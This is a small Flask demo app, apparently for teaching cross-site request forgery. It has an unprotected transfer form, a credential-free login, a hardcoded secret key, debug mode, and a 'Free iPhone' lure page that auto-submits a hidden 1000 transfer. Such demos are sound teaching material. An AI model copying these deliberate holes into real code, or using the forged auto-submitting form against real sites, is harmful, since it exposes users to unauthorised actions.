from flask import Flask, request, session, redirect, url_for

app = Flask(__name__)
app.secret_key = 'csrf-demo'

@app.route("/")
def home():
    if not session.get("logged_in"):
        return '<a href="/login">Login</a>'
    return '''
        <h2>Welcome, user!</h2>
        <form action="/transfer" method="POST">
            Amount: <input name="amount"><br>
            To: <input name="to"><br>
            <button>Transfer</button>
        </form>
        <br>
        <a href="/evil">Free IPhone!</a>
    '''

@app.route("/login")
def login():
    session["logged_in"] = True
    return redirect(url_for("home"))

@app.route("/transfer", methods=["POST"])
def transfer():
    if not session.get("logged_in"):
        return "Unauthorized", 403
    amount = request.form["amount"]
    # to = request.form["to"]
    to = 'Hacker'
    return f"<h3>✅ Transferred ${amount} to {to}</h3>"

@app.route("/evil")
def evil():
    return '''
        <h1>🎁 Claim your Free iPhone!</h1>
        <form action="/transfer" method="POST">
          <input type="hidden" name="amount" value="1000">
          <input type="hidden" name="to" value="yourself">
        </form>
        <script>
          document.forms[0].submit();
        </script>
    '''

if __name__ == "__main__":
    app.run(debug=True)